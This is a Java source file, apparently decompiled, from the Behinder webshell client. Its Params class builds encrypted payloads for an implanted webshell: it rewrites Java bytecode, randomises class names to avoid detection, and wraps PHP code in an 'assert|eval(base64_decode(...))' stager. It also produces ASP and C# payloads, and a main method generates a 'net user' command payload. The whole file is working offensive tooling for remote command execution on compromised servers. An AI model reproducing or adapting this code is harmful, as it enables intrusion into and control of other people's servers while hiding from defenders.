package net.rebeyond.behinder.core;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javassist.ByteArrayClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import javassist.CtMethod;
import javassist.CtNewMethod;
import javassist.CtField.Initializer;
import net.rebeyond.behinder.dao.TransProtocolDao;
import net.rebeyond.behinder.entity.TransProtocol;
import net.rebeyond.behinder.utils.ReplacingInputStream;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONObject;
import org.objectweb.asm.ClassAdapter;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.FieldVisitor;
import org.objectweb.asm.MethodVisitor;

public class Params {
   private static Object t = new Object();
   public static Map payloadClassCache = new HashMap();
   public static Map legacyPayloadClassCache = new HashMap();

   public static byte[] getParamedClass(String clsName, final Map params) throws Exception {
      ClassReader classReader = new ClassReader(String.format("net.rebeyond.behinder.payload.java.%s", clsName));
      ClassWriter cw = new ClassWriter(1);
      String opcodeClassName = String.format("net.rebeyond.behinder.payload.java.%s", clsName).replace(".", "/");
      classReader.accept(new ClassAdapter(cw) {
         public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
            if (params.containsKey(filedName)) {
               String paramValue = (String)params.get(filedName);
               return super.visitField(arg0, filedName, arg2, arg3, paramValue);
            } else {
               return super.visitField(arg0, filedName, arg2, arg3, arg4);
            }
         }
      }, 0);
      byte[] result = cw.toByteArray();
      String oldClassName = String.format("net/rebeyond/behinder/payload/java/%s", clsName);
      if (!clsName.equals("LoadNativeLibrary")) {
         String newClassName = Utils.getRandomClassName(oldClassName);
         result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)(oldClassName.length() + 2), 76}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)(newClassName.length() + 2), 76}, newClassName.getBytes()));
         result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)oldClassName.length()}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)newClassName.length()}, newClassName.getBytes()));
      }

      result[7] = 50;
      return result;
   }

   private void fillJavaParams(MethodVisitor mv, String className, Map params) {
      int blockSize = '\ufffa';
      Iterator var5 = params.keySet().iterator();

      while(var5.hasNext()) {
         String paramName = (String)var5.next();
         String paramValue = (String)params.get(paramName);
         if (paramValue.length() < blockSize) {
         }
      }

   }

   private static void setJavaParam(String className, MethodVisitor mv, String paramName, String[] paramValues) {
      mv.visitLdcInsn("");
      mv.visitFieldInsn(179, className, paramName, "Ljava/lang/String;");
      mv.visitTypeInsn(187, "java/lang/StringBuilder");
      mv.visitInsn(89);
      mv.visitMethodInsn(183, "java/lang/StringBuilder", "<init>", "()V");
      mv.visitFieldInsn(178, className, paramName, "Ljava/lang/String;");
      mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;");
      String[] var4 = paramValues;
      int var5 = paramValues.length;

      for(int var6 = 0; var6 < var5; ++var6) {
         String paramValue = var4[var6];
         mv.visitLdcInsn(paramValue);
         mv.visitMethodInsn(182, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;");
      }

      mv.visitMethodInsn(182, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;");
      mv.visitFieldInsn(179, className, paramName, "Ljava/lang/String;");
   }

   public static byte[] getParamedClass(byte[] classBytes, final Map params, String newClassName) throws Exception {
      ClassReader classReader = new ClassReader(classBytes);
      final String clsName = classReader.getClassName();
      ClassWriter cw = new ClassWriter(1);
      classReader.accept(new ClassAdapter(cw) {
         public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
            if (name.equals("<clinit>")) {
               int blockSize = '\ufffa';
               MethodVisitor mv = this.cv.visitMethod(access, name, desc, signature, exceptions);

               String paramName;
               String[] values;
               for(Iterator var8 = params.keySet().iterator(); var8.hasNext(); Params.setJavaParam(clsName, mv, paramName, values)) {
                  paramName = (String)var8.next();
                  String paramValue = (String)params.get(paramName);
                  values = null;
                  if (paramValue.length() > blockSize) {
                     values = Utils.splitString(paramValue, blockSize);
                  } else {
                     values = new String[]{paramValue};
                  }
               }

               mv.visitEnd();
               return mv;
            } else {
               return this.cv.visitMethod(access, name, desc, signature, exceptions);
            }
         }
      }, 0);
      byte[] result = cw.toByteArray();
      if (!clsName.equals("LoadNativeLibrary")) {
         result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)(clsName.length() + 2), 76}, clsName.getBytes()), Utils.mergeBytes(new byte[]{(byte)(newClassName.length() + 2), 76}, newClassName.getBytes()));
         result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)clsName.length()}, clsName.getBytes()), Utils.mergeBytes(new byte[]{(byte)newClassName.length()}, newClassName.getBytes()));
      }

      result[7] = 50;
      return result;
   }

   public static byte[] getParamedClass(final String clsName, byte[] classBytes, final Map params) throws Exception {
      String opcodeClassName = String.format("net/rebeyond/behinder/payload/java/%s", clsName);
      String newClassName = Utils.getRandomClassName(opcodeClassName);
      ClassReader classReader = new ClassReader(classBytes);
      ClassWriter cw = new ClassWriter(1);
      classReader.accept(new ClassAdapter(cw) {
         public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
            if (name.equals("<init>")) {
               int blockSize = '\ufffa';
               MethodVisitor mv = this.cv.visitMethod(access, name, desc, signature, exceptions);

               String paramName;
               String[] values;
               for(Iterator var8 = params.keySet().iterator(); var8.hasNext(); Params.setJavaParam(clsName, mv, paramName, values)) {
                  paramName = (String)var8.next();
                  String paramValue = (String)params.get(paramName);
                  values = null;
                  if (paramValue.length() > blockSize) {
                     values = Utils.splitString(paramValue, blockSize);
                  } else {
                     values = new String[]{paramValue};
                  }
               }

               mv.visitEnd();
               return mv;
            } else {
               return this.cv.visitMethod(access, name, desc, signature, exceptions);
            }
         }
      }, 0);
      byte[] result = cw.toByteArray();
      if (!clsName.equals("LoadNativeLibrary")) {
         result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)(clsName.length() + 2), 76}, clsName.getBytes()), Utils.mergeBytes(new byte[]{(byte)(newClassName.length() + 2), 76}, newClassName.getBytes()));
         result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)clsName.length()}, clsName.getBytes()), Utils.mergeBytes(new byte[]{(byte)newClassName.length()}, newClassName.getBytes()));
      } else {
         result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)(clsName.length() + 2), 76}, clsName.getBytes()), Utils.mergeBytes(new byte[]{(byte)(opcodeClassName.length() + 2), 76}, opcodeClassName.getBytes()));
         result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)clsName.length()}, clsName.getBytes()), Utils.mergeBytes(new byte[]{(byte)opcodeClassName.length()}, opcodeClassName.getBytes()));
      }

      result[7] = 50;
      return result;
   }

   public static byte[] getTransProtocoledClass(String className, TransProtocol transProtocol) throws Exception {
      String transProtocolName = transProtocol.getName();
      if (transProtocol.getId() < 0) {
         String key = ((LegacyCryptor)transProtocol.getCryptor()).getKey();
         if (legacyPayloadClassCache.containsKey(transProtocolName) && ((Map)legacyPayloadClassCache.get(transProtocolName)).containsKey(key) && ((Map)((Map)legacyPayloadClassCache.get(transProtocolName)).get(key)).containsKey(className)) {
            return ((CtClass)((Map)((Map)legacyPayloadClassCache.get(transProtocolName)).get(key)).get(className)).toBytecode();
         } else {
            ClassPool cp = ClassPool.getDefault();
            CtClass PocCls = cp.getAndRename(String.format("net.rebeyond.behinder.payload.java.%s", className), Utils.getRandomString(10));
            CtMethod encodeMethod = CtNewMethod.make(transProtocol.getEncode(), PocCls);
            PocCls.removeMethod(PocCls.getDeclaredMethod("Encrypt"));
            PocCls.addMethod(encodeMethod);
            PocCls.setName(className);
            PocCls.detach();
            Map payloadClass = new HashMap();
            payloadClass.put(className, PocCls);
            Map keyPayloadMap = new HashMap();
            keyPayloadMap.put(key, payloadClass);
            legacyPayloadClassCache.put(transProtocolName, keyPayloadMap);
            return PocCls.toBytecode();
         }
      } else if (payloadClassCache.containsKey(transProtocolName) && ((Map)payloadClassCache.get(transProtocolName)).containsKey(className)) {
         return ((CtClass)((Map)payloadClassCache.get(transProtocolName)).get(className)).toBytecode();
      } else {
         ClassPool cp = ClassPool.getDefault();
         CtClass PocCls = cp.getAndRename(String.format("net.rebeyond.behinder.payload.java.%s", className), Utils.getRandomString(10));
         CtMethod encodeMethod = CtNewMethod.make(transProtocol.getEncode(), PocCls);
         PocCls.removeMethod(PocCls.getDeclaredMethod("Encrypt"));
         PocCls.addMethod(encodeMethod);
         PocCls.setName(className);
         PocCls.detach();
         Map payloadClass = new HashMap();
         payloadClass.put(className, PocCls);
         payloadClassCache.put(transProtocolName, payloadClass);
         return PocCls.toBytecode();
      }
   }

   public static byte[] getParamedClass(String className, Map params, TransProtocol transProtocol) throws Exception {
      byte[] result = getTransProtocoledClass(className, transProtocol);
      result = getParamedClass(className, result, params);
      return result;
   }

   private static byte[] getParamedClassByJavaassit(String className, byte[] classBody, Map params) throws Exception {
      ClassPool cp = ClassPool.getDefault();
      cp.insertClassPath(new ByteArrayClassPath(className, classBody));
      CtClass PocCls = cp.get(className);
      Iterator var5 = params.keySet().iterator();

      while(true) {
         while(var5.hasNext()) {
            String name = (String)var5.next();
            String value = (String)params.get(name);
            int blockSize = 'ￜ';
            if (value.length() > blockSize) {
               int count = value.length() / blockSize;
               String fieldSource = "public static String[] payloadBodyArr= new String[]{%s};";
               StringBuilder element = new StringBuilder();

               int remaining;
               for(remaining = 0; remaining < count; ++remaining) {
                  element.append("\"");
                  element.append(value, remaining * blockSize, remaining * blockSize + blockSize);
                  element.append("\",");
               }

               if ((remaining = value.length() % blockSize) > 0) {
                  element.append("\"");
                  element.append(value, count * blockSize, count * blockSize + remaining);
                  element.append("\",");
               }

               element.setLength(element.length() - 1);
               fieldSource = String.format(fieldSource, element);
               synchronized(t) {
                  CtField ctField = PocCls.getDeclaredField("payloadBodyArr");
                  PocCls.removeField(ctField);
                  ctField = CtField.make(fieldSource, PocCls);
                  PocCls.addField(ctField);
               }
            } else {
               synchronized(t) {
                  CtField ctField = PocCls.getDeclaredField(name);
                  PocCls.removeField(ctField);
                  PocCls.addField(ctField, Initializer.constant(value));
               }
            }
         }

         PocCls.detach();
         return PocCls.toBytecode();
      }
   }

   public static byte[] getParamedPhp(String clsName, Map params, TransProtocol transProtocol) throws Exception {
      String basePath = "net/rebeyond/behinder/payload/php/";
      String payloadPath = basePath + clsName + ".php";
      StringBuilder code = new StringBuilder();
      ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
      ByteArrayOutputStream bos = new ByteArrayOutputStream();

      int b;
      while(-1 != (b = bis.read())) {
         bos.write(b);
      }

      bis.close();
      String payloadBody = bos.toString();
      if (payloadBody.trim().startsWith("<?")) {
         payloadBody = payloadBody.replaceFirst("<\\?", "");
      }

      code.append(payloadBody + "\n" + transProtocol.getEncode() + "\n");
      String paraList = "";
      Iterator var11 = getPhpParams(code.toString()).iterator();

      while(var11.hasNext()) {
         String paraName = (String)var11.next();
         if (params.keySet().contains(paraName)) {
            String paraValue = (String)params.get(paraName);
            paraValue = Base64.getEncoder().encodeToString(paraValue.getBytes());
            code.append(String.format("$%s=\"%s\";$%s=base64_decode($%s);", paraName, paraValue, paraName, paraName));
            paraList = paraList + ",$" + paraName;
         } else {
            code.append(String.format("$%s=\"%s\";", paraName, ""));
            paraList = paraList + ",$" + paraName;
         }
      }

      paraList = paraList.replaceFirst(",", "");
      code.append("\r\nmain(" + paraList + ");");
      return code.toString().getBytes();
   }

   public static byte[] getParamedAssembly(String clsName, Map params, TransProtocol transProtocol) throws Exception {
      return getParamedAssembly(clsName, params);
   }

   private static byte[] getBlobLength(int length) {
      byte[] sizeBytes = new byte[0];
      if (length <= 127) {
         sizeBytes = new byte[]{(byte)length};
      } else if (length > 127 && length <= 1023) {
         sizeBytes = Utils.shortToBytes('耀' | length);
      } else if (length >= 16384) {
         sizeBytes = Utils.intToBytes(-1073741824 | length);
      }

      return sizeBytes;
   }

   public static void main(String[] args) throws Exception {
      Map p = new HashMap();
      p.put("cmd", "net user");
      TransProtocolDao transProtocolDao = new TransProtocolDao();
      TransProtocol transProtocol = transProtocolDao.findTransProtocolById(3);
      byte[] data = getParamedClass((String)"net.rebeyond.behinder.payload.java.Cmd", (Map)p, (TransProtocol)transProtocol);
      FileOutputStream fos = new FileOutputStream("d:/cmd.class");
      fos.write(data);
      fos.flush();
      fos.close();
   }

   public static byte[] getParamedClassForPlugin(String payloadPath, final Map params) throws Exception {
      ClassReader classReader = new ClassReader(Utils.getFileData(payloadPath));
      ClassWriter cw = new ClassWriter(1);
      classReader.accept(new ClassAdapter(cw) {
         public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
            if (params.containsKey(filedName)) {
               String paramValue = (String)params.get(filedName);
               return super.visitField(arg0, filedName, arg2, arg3, paramValue);
            } else {
               return super.visitField(arg0, filedName, arg2, arg3, arg4);
            }
         }
      }, 0);
      byte[] result = cw.toByteArray();
      return result;
   }

   public static byte[] getParamedAssemblyForPlugin(String payloadPath, Map params) throws Exception {
      byte[] result = Utils.getFileData(payloadPath);
      if (params.keySet().size() == 0) {
         return result;
      } else {
         String paramsStr = "";

         String paramName;
         String paramValue;
         for(Iterator var4 = params.keySet().iterator(); var4.hasNext(); paramsStr = paramsStr + paramName + ":" + paramValue + ",") {
            paramName = (String)var4.next();
            paramValue = Base64.getEncoder().encodeToString(((String)params.get(paramName)).getBytes("UTF-8"));
         }

         paramsStr = paramsStr.substring(0, paramsStr.length() - 1);
         String token = "~~~~~~" + paramsStr;
         return Utils.mergeBytes(result, token.getBytes());
      }
   }

   public static byte[] getParamedPhpForPlugin(String payloadPath, Map params) throws Exception {
      StringBuilder code = new StringBuilder();
      ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getFileData(payloadPath));
      ByteArrayOutputStream bos = new ByteArrayOutputStream();

      int b;
      while(-1 != (b = bis.read())) {
         bos.write(b);
      }

      bis.close();
      String codeBody = bos.toString();
      if (codeBody.trim().startsWith("<?")) {
         codeBody = codeBody.replaceFirst("<\\?", "");
      }

      code.append(codeBody);
      String paramsString = String.format("\n;$params=json_decode(base64_decode('%s'),true);", Base64.getEncoder().encodeToString(JSONObject.valueToString(params).getBytes()));
      code.append(paramsString);
      return code.toString().getBytes();
   }

   public static byte[] getParamedAssembly(String clsName, Map params) throws Exception {
      String basePath = "net/rebeyond/behinder/payload/csharp/";
      String payloadPath = basePath + clsName + ".dll";
      byte[] result = Utils.getResourceData(payloadPath);
      if (params.keySet().size() == 0) {
         return result;
      } else {
         String paramsStr = "";

         String paramName;
         String paramValue;
         for(Iterator var6 = params.keySet().iterator(); var6.hasNext(); paramsStr = paramsStr + paramName + ":" + paramValue + ",") {
            paramName = (String)var6.next();
            paramValue = Base64.getEncoder().encodeToString(((String)params.get(paramName)).getBytes("UTF-8"));
         }

         paramsStr = paramsStr.substring(0, paramsStr.length() - 1);
         String token = "~~~~~~" + paramsStr;
         return Utils.mergeBytes(result, token.getBytes());
      }
   }

   public static byte[] getParamedAssemblyClassic(String clsName, Map params) throws Exception {
      String basePath = "net/rebeyond/behinder/payload/csharp/";
      String payloadPath = basePath + clsName + ".dll";
      ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      Iterator var6 = params.keySet().iterator();

      while(var6.hasNext()) {
         String paraName = (String)var6.next();
         String paraValue = (String)params.get(paraName);
         StringBuilder searchStr = new StringBuilder();

         while(searchStr.length() < paraValue.length()) {
            searchStr.append(paraName);
         }

         byte[] search = Utils.ascii2unicode("~" + searchStr.substring(0, paraValue.length()), 0);
         byte[] replacement = Utils.ascii2unicode(paraValue, 1);
         InputStream ris = new ReplacingInputStream(bis, search, replacement);

         int b;
         while(-1 != (b = ris.read())) {
            bos.write(b);
         }

         ris.close();
      }

      return bos.toByteArray();
   }

   public static byte[] getParamedPhp(String clsName, Map params) throws Exception {
      String basePath = "net/rebeyond/behinder/payload/php/";
      String payloadPath = basePath + clsName + ".php";
      StringBuilder code = new StringBuilder();
      ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
      ByteArrayOutputStream bos = new ByteArrayOutputStream();

      int b;
      while(-1 != (b = bis.read())) {
         bos.write(b);
      }

      bis.close();
      code.append(bos.toString());
      String paraList = "";
      Iterator var9 = getPhpParams(code.toString()).iterator();

      while(var9.hasNext()) {
         String paraName = (String)var9.next();
         if (params.keySet().contains(paraName)) {
            String paraValue = (String)params.get(paraName);
            paraValue = Base64.getEncoder().encodeToString(paraValue.getBytes());
            code.append(String.format("$%s=\"%s\";$%s=base64_decode($%s);", paraName, paraValue, paraName, paraName));
            paraList = paraList + ",$" + paraName;
         } else {
            code.append(String.format("$%s=\"%s\";", paraName, ""));
            paraList = paraList + ",$" + paraName;
         }
      }

      paraList = paraList.replaceFirst(",", "");
      code.append("\r\nmain(" + paraList + ");");
      return ("assert|eval(base64_decode('" + Base64.getEncoder().encodeToString(code.toString().getBytes()) + "'));").getBytes();
   }

   public static List getPhpParams(String phpPayload) {
      List paramList = new ArrayList();
      Pattern mainPattern = Pattern.compile("main\\s*\\([^\\)]*\\)");
      Matcher mainMatch = mainPattern.matcher(phpPayload);
      if (mainMatch.find()) {
         String mainStr = mainMatch.group(0);
         Pattern paramPattern = Pattern.compile("\\$([a-zA-Z]*)");
         Matcher paramMatch = paramPattern.matcher(mainStr);

         while(paramMatch.find()) {
            paramList.add(paramMatch.group(1));
         }
      }

      return paramList;
   }

   public static byte[] getParamedAsp(String clsName, Map params, TransProtocol transProtocol) throws Exception {
      String basePath = "net/rebeyond/behinder/payload/asp/";
      String payloadPath = basePath + clsName + ".asp";
      StringBuilder codeBuilder = new StringBuilder();
      ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
      ByteArrayOutputStream bos = new ByteArrayOutputStream();

      int b;
      while(-1 != (b = bis.read())) {
         bos.write(b);
      }

      bis.close();
      codeBuilder.append(bos.toString());
      String codeBody = codeBuilder.toString().replace("__Encrypt__", transProtocol.getEncode());
      String paraList = "";
      if (params != null && params.size() > 0) {
         paraList = paraList + "Array(";

         String paraValueEncoded;
         for(Iterator var11 = params.keySet().iterator(); var11.hasNext(); paraList = paraList + "," + paraValueEncoded) {
            String paraName = (String)var11.next();
            String paraValue = (String)params.get(paraName);
            paraValueEncoded = "";

            for(int i = 0; i < paraValue.length(); ++i) {
               paraValueEncoded = paraValueEncoded + "&chrw(" + paraValue.charAt(i) + ")";
            }

            paraValueEncoded = paraValueEncoded.replaceFirst("&", "");
         }

         paraList = paraList + ")";
      }

      paraList = paraList.replaceFirst(",", "");
      codeBody = codeBody + "\r\nmain " + paraList + "";
      return codeBody.getBytes();
   }

   public static byte[] getParamedAsp(String clsName, Map params) throws Exception {
      String basePath = "net/rebeyond/behinder/payload/asp/";
      String payloadPath = basePath + clsName + ".asp";
      StringBuilder code = new StringBuilder();
      ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
      ByteArrayOutputStream bos = new ByteArrayOutputStream();

      int b;
      while(-1 != (b = bis.read())) {
         bos.write(b);
      }

      bis.close();
      code.append(bos.toString());
      String paraList = "";
      if (params.size() > 0) {
         paraList = paraList + "Array(";

         String paraValueEncoded;
         for(Iterator var9 = params.keySet().iterator(); var9.hasNext(); paraList = paraList + "," + paraValueEncoded) {
            String paraName = (String)var9.next();
            String paraValue = (String)params.get(paraName);
            paraValueEncoded = "";

            for(int i = 0; i < paraValue.length(); ++i) {
               paraValueEncoded = paraValueEncoded + "&chrw(" + paraValue.charAt(i) + ")";
            }

            paraValueEncoded = paraValueEncoded.replaceFirst("&", "");
         }

         paraList = paraList + ")";
      }

      paraList = paraList.replaceFirst(",", "");
      code.append("\r\nmain " + paraList + "");
      return code.toString().getBytes();
   }

   public static class t extends ClassLoader {
      public Class get(byte[] b) {
         return super.defineClass(b, 0, b.length);
      }
   }
}
